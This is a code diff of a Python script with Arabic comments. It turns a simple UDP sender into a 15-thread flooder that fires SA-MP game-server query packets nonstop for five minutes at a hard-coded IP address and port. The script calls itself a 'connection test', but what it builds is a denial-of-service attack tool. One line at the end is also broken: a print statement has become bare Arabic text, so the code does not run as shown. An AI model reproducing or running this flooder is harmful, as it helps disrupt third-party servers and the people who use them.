@@ -1,32 +1,41 @@
 import socket
 import time
+import threading
 
-# حدد البيانات
-TARGET_IP = "89.46.1.130"  # استبدله بـ IP الهدف
-TARGET_PORT = 7000        # استبدله بمنفذ السيرفر
-DURATION = 300              # مدة الاختبار بالثواني
+TARGET_IP = "89.46.1.130"  # IP الهدف
+TARGET_PORT = 7000        # المنفذ
+DURATION = 300              # المدة بالثواني
+THREADS_COUNT = 15          # عدد الخيوط (Threads) لزيادة السرعة
 
-def test_connection():
+def worker(end_time):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # بناء حزمة SAMP بشكل صحيح
+    payload = b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
     
-    # حزمة استعلام SAMP بسيطة (Info Query)
-    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
-    
-    end_time = time.time() + DURATION
     count = 0
-    
-    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT}...")
-    
-    try:
-        while time.time() < end_time:
+    while time.time() < end_time:
+        try:
             client.sendto(payload, (TARGET_IP, TARGET_PORT))
             count += 1
-    except Exception as e:
-        print(f"حدث خطأ: {e}")
-    finally:
-        client.close()
-        print(f"تم إرسال {count} حزمة استعلام.")
+        except Exception:
+            pass
+    client.close()
+    print(f"خيط (Thread) انتهى، تم إرسال {count} حزمة.")
+
+def main():
+    end_time = time.time() + DURATION
+    print(f"جاري بدء اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيوط...")
+    
+    threads = []
+    for _ in range(THREADS_COUNT):
+        t = threading.Thread(target=worker, args=(end_time,))
+        threads.append(t)
+        t.start()
+        
+    for t in threads:
+        t.join()
+        
+تم الانتهاء من الاختبار.
 
 if __name__ == "__main__":
-    test_connection()
-    
+    main()
